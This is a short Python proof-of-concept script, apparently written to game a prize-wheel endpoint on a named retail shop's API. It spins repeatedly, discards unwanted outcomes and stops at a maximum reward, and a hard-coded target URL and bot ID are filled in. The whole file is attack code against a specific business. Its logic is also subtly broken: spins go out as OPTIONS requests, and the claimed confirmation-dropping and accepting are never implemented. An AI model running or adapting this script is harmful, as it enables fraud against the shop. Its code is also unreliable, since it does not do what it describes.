#!/usr/bin/env python3
# poc.py - VenomStore Wheel of Fortune Exploit
# nocivics - 2026-07-24

import requests
import time

class VenomWheelExploit:
    def __init__(self, base_url, bot_id, api_key, auth_token):
        self.base_url = base_url.rstrip('/')
        self.bot_id = bot_id
        self.api_key = api_key
        self.auth_token = auth_token
        self.headers = {
            "apikey": api_key,
            "Authorization": f"Bearer {auth_token}",
            "Content-Type": "application/json"
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def _get_endpoint(self, action):
        timestamp = int(time.time() * 1000)
        return f"{self.base_url}/functions/v1/retail-mini-app-serve?action={action}&bot_id={self.bot_id}&_t={timestamp}"

    def spin(self):
        url = self._get_endpoint("spin_fortune_wheel")
        try:
            response = self.session.options(url)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def exploit(self, target_reward="max", attempts=10):
        """
        Exploit by repeatedly spinning and dropping confirmations.
        Only accepts when target reward appears.
        """
        for attempt in range(attempts):
            print(f"[*] Attempt {attempt+1}/{attempts}")
            result = self.spin()
            if not result:
                continue
            
            reward = result.get("reward", {}).get("type", "unknown")
            print(f"[+] Reward: {reward}")
            
            if target_reward in reward.lower():
                print(f"[!] Target found! Accepting...")
                return True
            
            print(f"[-] Dropping, retrying...")
            time.sleep(0.5)
        
        return False

def main():
    CONFIG = {
        "base_url": "https://api.venomgermany.com",
        "bot_id": "4f0355aa-9791-4912-9136-917f2658188d",
        "api_key": "YOUR_API_KEY",
        "auth_token": "YOUR_AUTH_TOKEN"
    }

    exploit = VenomWheelExploit(
        base_url=CONFIG["base_url"],
        bot_id=CONFIG["bot_id"],
        api_key=CONFIG["api_key"],
        auth_token=CONFIG["auth_token"]
    )

    print("[*] Starting Wheel of Fortune exploit")
    if exploit.exploit(target_reward="max", attempts=10):
        print("[+] Exploit successful!")
    else:
        print("[!] Exploit failed")
